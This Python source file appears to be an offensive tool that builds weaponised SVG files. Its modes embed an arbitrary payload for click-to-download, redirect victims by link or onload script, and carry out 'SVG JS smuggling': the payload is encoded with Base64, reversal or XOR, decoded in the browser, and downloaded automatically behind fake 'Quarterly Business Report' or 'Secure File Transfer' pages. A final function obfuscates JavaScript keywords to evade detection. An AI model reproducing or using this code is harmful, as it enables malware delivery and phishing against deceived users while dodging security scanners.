import os
import base64
import html
from config import OUTPUT_DIR


def encode_file_to_base64(file_path):
    """Read file and return Base64-encoded string"""
    with open(file_path, "rb") as f:
        return base64.b64encode(f.read()).decode()



class SVGGenerator:
    def process_image(self, image_source):
        """
        Processes image source:
        - If local file, returns Data URI (base64)
        - If URL, returns URL
        - If empty, returns placeholder
        """
        if not image_source:
             return "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAwIiBoZWlnaHQ9IjQwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjZjVmNWY1Ii8+PHRleHQgeD0iNTAwIiB5PSIyMDAiIGZvbnQtc2l6ZT0iMjQiIHRleHQtYW5jaG9yPSJtaWRkbGUiPkltYWdlIFBsYWNlaG9sZGVyPC90ZXh0Pjwvc3ZnPg=="
        
        if os.path.exists(image_source):
            try:
                b64_data = encode_file_to_base64(image_source)
                ext = os.path.splitext(image_source)[1].lower()
                mime_map = {
                    '.jpg': 'image/jpeg',
                    '.jpeg': 'image/jpeg',
                    '.png': 'image/png',
                    '.gif': 'image/gif',
                    '.bmp': 'image/bmp'
                }
                mime_type = mime_map.get(ext, 'image/jpeg')
                return f"data:{mime_type};base64,{b64_data}"
            except Exception as e:
                raise Exception(f"Failed to process local image: {str(e)}")
        elif image_source.startswith(('http://', 'https://')):
            return image_source
        else:
            raise ValueError("Invalid image source (must be a local file path or http/https URL).")

    def generate(self, mode, params, save_path=None):
        """
        Generates SVG file based on mode.
        params: dict containing required parameters for the mode
        save_path: optional, if not provided will use default in outputs/
        """
        try:
            svg_content = ""
            
            # Common parameters
            click_text = params.get('click_text', "Scan complete. Click to download")
            click_text_escaped = html.escape(click_text)

            if "Click Download" in mode and "JS" not in mode:
                payload_path = params.get('payload_path')
                download_filename = params.get('download_filename')
                image_source = params.get('image_source')

                if not payload_path or not os.path.exists(payload_path):
                    raise ValueError("Payload file not found.")
                if not download_filename:
                    raise ValueError("Download filename is required.")

                payload_b64 = encode_file_to_base64(payload_path)
                payload_data_uri = f"data:application/octet-stream;base64,{payload_b64}"
                image_data_uri = self.process_image(image_source)
                download_filename_escaped = html.escape(download_filename)

                svg_content = f'''<svg width="100%" height="100%" viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice"
     xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     style="position:fixed;top:0;left:0;">
  <text x="400" y="50" font-size="24" text-anchor="middle" fill="#333333" font-family="Segoe UI, Arial, sans-serif">{click_text_escaped}</text>
  <a href="{payload_data_uri}" download="{download_filename_escaped}">
    <image href="{image_data_uri}" 
         x="100" y="80" width="600" height="400" preserveAspectRatio="xMidYMid meet"/>
    <text x="400" y="550" font-size="28" text-anchor="middle" fill="#0066cc" text-decoration="underline" font-family="Segoe UI, Arial, sans-serif">Click here to download file</text>
  </a>
</svg>'''

            elif "URL Redirect" in mode:
                target_url = params.get('target_url')
                image_source = params.get('image_source')

                if not target_url:
                    raise ValueError("Target URL is required.")

                image_data_uri = self.process_image(image_source)
                target_url_escaped = html.escape(target_url)

                svg_content = f'''<svg width="100%" height="100%" viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice"
     xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     style="position:fixed;top:0;left:0;">
  <text x="400" y="50" font-size="24" text-anchor="middle" fill="#333333" font-family="Segoe UI, Arial, sans-serif">{click_text_escaped}</text>
  <a href="{target_url_escaped}" target="_blank">
    <image href="{image_data_uri}" 
         x="100" y="80" width="600" height="400" preserveAspectRatio="xMidYMid meet"/>
    <text x="400" y="550" font-size="28" text-anchor="middle" fill="#0066cc" text-decoration="underline" font-family="Segoe UI, Arial, sans-serif">Click here to open link</text>
  </a>
</svg>'''

            elif "Auto Redirect" in mode:
                target_url = params.get('target_url')
                if not target_url:
                    raise ValueError("Target URL is required.")
                
                target_url_escaped = html.escape(target_url)
                
                svg_content = f'''<svg width="100%" height="100%" viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice"
     xmlns="http://www.w3.org/2000/svg"
     style="position:fixed;top:0;left:0;" onload="redirect()">
  <rect width="800" height="600" fill="#f5f5f5"/>
  <text x="400" y="290" font-size="16" text-anchor="middle" fill="#999" font-family="Segoe UI, Arial, sans-serif">Redirecting, please wait...</text>
  <script type="text/javascript">
    // <![CDATA[
    function redirect() {{
        var delay = Math.floor(Math.random() * 301) + 200;
        setTimeout(function() {{
            window.location.href = "{target_url_escaped}";
        }}, delay);
    }}
    // ]]>
  </script>
</svg>'''
            
            elif "JS" in mode or "Smuggling" in mode:
                # SVG JS Smuggling Mode - standalone implementation
                payload_path = params.get('payload_path')
                download_filename = params.get('download_filename')
                encoding_method = params.get('encoding_method', 'Standard Base64')
                enable_evasion = params.get('enable_evasion', False)
                decoy_mode = params.get('decoy_mode', 'template1')

                if not payload_path or not os.path.exists(payload_path):
                    raise ValueError("Payload file not found.")
                if not download_filename:
                    raise ValueError("Download filename is required.")

                # Read payload and encode
                with open(payload_path, 'rb') as f:
                    payload_data = f.read()

                if encoding_method in ("Reverse + Base64",):
                    reversed_data = payload_data[::-1]
                    encoded_data = base64.b64encode(reversed_data).decode()
                    decoder_js = '''
            function _decode(d) {
                var b = atob(d);
                var arr = [];
                for (var i = 0; i < b.length; i++) arr.push(b.charCodeAt(i));
                arr.reverse();
                return new Uint8Array(arr);
            }'''
                elif encoding_method in ("XOR + Base64",):
                    key = os.urandom(16)
                    key_hex = key.hex()
                    encrypted = bytes([payload_data[i] ^ key[i % len(key)] for i in range(len(payload_data))])
                    encoded_data = base64.b64encode(encrypted).decode()
                    decoder_js = f'''
            function _decode(d) {{
                var raw = atob(d);
                var k = "{key_hex}";
                var kb = [];
                for (var i = 0; i < k.length; i += 2) kb.push(parseInt(k.substr(i, 2), 16));
                var out = new Uint8Array(raw.length);
                for (var i = 0; i < raw.length; i++) out[i] = raw.charCodeAt(i) ^ kb[i % kb.length];
                return out;
            }}'''
                else:
                    # Standard Base64 (default)
                    encoded_data = base64.b64encode(payload_data).decode()
                    decoder_js = '''
            function _decode(d) {
                var b = atob(d);
                var arr = new Uint8Array(b.length);
                for (var i = 0; i < b.length; i++) arr[i] = b.charCodeAt(i);
                return arr;
            }'''

                download_name_escaped = html.escape(download_filename)

                # Select decoy content
                if decoy_mode == "template2":
                    decoy_svg_content = _get_svg_decoy_template2()
                else:
                    decoy_svg_content = _get_svg_decoy_template1()

                # Build JS smuggling code
                smuggling_js = f'''
        (function() {{
            {decoder_js}
            
            var _data = "{encoded_data}";
            var _decoded = _decode(_data);
            var _blob = new Blob([_decoded], {{type: "application/octet-stream"}});
            var _url = URL.createObjectURL(_blob);
            
            var _ns = "http://www.w3.org/1999/xhtml";
            var _a = document.createElementNS(_ns, "a");
            _a.href = _url;
            _a.download = "{download_name_escaped}";
            _a.style.display = "none";
            
            var _fo = document.createElementNS("http://www.w3.org/2000/svg", "foreignObject");
            _fo.setAttribute("width", "0");
            _fo.setAttribute("height", "0");
            _fo.appendChild(_a);
            document.documentElement.appendChild(_fo);
            
            setTimeout(function() {{
                _a.click();
                setTimeout(function() {{
                    URL.revokeObjectURL(_url);
                    document.documentElement.removeChild(_fo);
                }}, 500);
            }}, 1000);
        }})();'''

                if enable_evasion:
                    smuggling_js = _apply_keyword_evasion_svg(smuggling_js)

                svg_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" 
     xmlns:xlink="http://www.w3.org/1999/xlink"
     width="100%" height="100%" viewBox="0 0 800 600"
     preserveAspectRatio="xMidYMid slice"
     style="position:fixed;top:0;left:0;">
  
  {decoy_svg_content}
  
  <script type="text/javascript">
  //<![CDATA[
    {smuggling_js}
  //]]>
  </script>
</svg>'''

            # Determine save path
            if not save_path:
                save_path = os.path.join(OUTPUT_DIR, "svg_smuggling.svg")

            with open(save_path, "w", encoding="utf-8") as f:
                f.write(svg_content)
            
            return os.path.abspath(save_path)

        except Exception as e:
            raise Exception(f"Failed to generate SVG: {str(e)}")


def _get_svg_decoy_template1():
    """
    SVG decoy template 1: Document preview page
    """
    return '''
  <!-- Background -->
  <rect width="800" height="600" fill="#f5f5f5"/>
  
  <!-- Top bar -->
  <rect x="0" y="0" width="800" height="50" fill="#0078d4"/>
  <text x="20" y="33" font-family="Segoe UI, Arial, sans-serif" font-size="16" fill="white" font-weight="bold">
    Online Document Viewer
  </text>
  <text x="650" y="33" font-family="Segoe UI, Arial, sans-serif" font-size="12" fill="rgba(255,255,255,0.8)">
    Secure Browsing
  </text>
  
  <!-- Document area -->
  <rect x="100" y="70" width="600" height="480" fill="white" rx="4" ry="4"
        style="filter: drop-shadow(0 2px 8px rgba(0,0,0,0.1))"/>
  
  <!-- Document content -->
  <text x="140" y="120" font-family="Segoe UI, Arial, sans-serif" font-size="18" fill="#333" font-weight="bold">
    Quarterly Business Report
  </text>
  <line x1="140" y1="132" x2="660" y2="132" stroke="#e0e0e0" stroke-width="1"/>
  
  <text x="140" y="165" font-family="Segoe UI, Arial, sans-serif" font-size="12" fill="#666">
    Preparing document for download...
  </text>
  <text x="140" y="188" font-family="Segoe UI, Arial, sans-serif" font-size="12" fill="#666">
    Processing file, please wait.
  </text>
  
  <!-- Loading animation -->
  <circle cx="400" cy="310" r="22" fill="none" stroke="#0078d4" stroke-width="3" stroke-dasharray="90" stroke-dashoffset="0">
    <animateTransform attributeType="xml" attributeName="transform" type="rotate"
                      from="0 400 310" to="360 400 310" dur="1s" repeatCount="indefinite"/>
  </circle>
  <text x="400" y="355" font-family="Segoe UI, Arial, sans-serif" font-size="13" fill="#999" text-anchor="middle">
    Loading document...
  </text>
  
  <!-- Bottom hint -->
  <text x="400" y="510" font-family="Segoe UI, Arial, sans-serif" font-size="11" fill="#999" text-anchor="middle">
    If the download does not start automatically, check your browser download settings.
  </text>
  <text x="400" y="530" font-family="Segoe UI, Arial, sans-serif" font-size="10" fill="#bbb" text-anchor="middle">
    This file is transmitted via encrypted channel. Please keep it secure.
  </text>
'''


def _get_svg_decoy_template2():
    """
    SVG decoy template 2: Secure file transfer page
    """
    return '''
  <!-- Background -->
  <rect width="800" height="600" fill="#1a1a2e"/>
  
  <!-- Center card -->
  <rect x="175" y="100" width="450" height="400" fill="#16213e" rx="12" ry="12"
        style="filter: drop-shadow(0 4px 20px rgba(0,0,0,0.3))"/>
  
  <!-- Lock icon -->
  <circle cx="400" cy="175" r="32" fill="none" stroke="#e94560" stroke-width="3"/>
  <rect x="383" y="170" width="34" height="28" fill="#e94560" rx="3" ry="3"/>
  <rect x="388" y="152" width="24" height="24" fill="none" stroke="#e94560" stroke-width="3" rx="12" ry="12"/>
  
  <!-- Title -->
  <text x="400" y="245" font-family="Segoe UI, Arial, sans-serif" font-size="20" fill="#e0e0e0" 
        text-anchor="middle" font-weight="bold">
    Secure File Transfer
  </text>
  
  <!-- Description -->
  <text x="400" y="280" font-family="Segoe UI, Arial, sans-serif" font-size="13" fill="#a0a0a0" text-anchor="middle">
    Preparing encrypted document for download
  </text>
  <text x="400" y="302" font-family="Segoe UI, Arial, sans-serif" font-size="13" fill="#a0a0a0" text-anchor="middle">
    Please wait, file is being decrypted...
  </text>
  
  <!-- Progress bar -->
  <rect x="240" y="340" width="320" height="8" fill="#0f3460" rx="4" ry="4"/>
  <rect x="240" y="340" width="0" height="8" fill="#e94560" rx="4" ry="4">
    <animate attributeName="width" from="0" to="320" dur="3s" fill="freeze"/>
  </rect>
  
  <!-- Percentage -->
  <text x="400" y="375" font-family="Segoe UI, Arial, sans-serif" font-size="12" fill="#a0a0a0" text-anchor="middle">
    Decrypting and downloading...
  </text>
  
  <!-- Bottom hint -->
  <text x="400" y="440" font-family="Segoe UI, Arial, sans-serif" font-size="11" fill="#666" text-anchor="middle">
    File will be automatically saved to your Downloads folder
  </text>
  <text x="400" y="462" font-family="Segoe UI, Arial, sans-serif" font-size="10" fill="#555" text-anchor="middle">
    End-to-end encrypted transfer. Do not screenshot or forward.
  </text>
'''


def _apply_keyword_evasion_svg(js_code):
    """Apply keyword evasion to JS code in SVG"""
    replacements = {
        'atob': "window[String.fromCharCode(97,116,111,98)]",
        'Blob': "window[String.fromCharCode(66,108,111,98)]",
        'Uint8Array': "window[String.fromCharCode(85,105,110,116,56,65,114,114,97,121)]",
    }
    for original, replacement in replacements.items():
        js_code = js_code.replace(original, replacement)
    return js_code
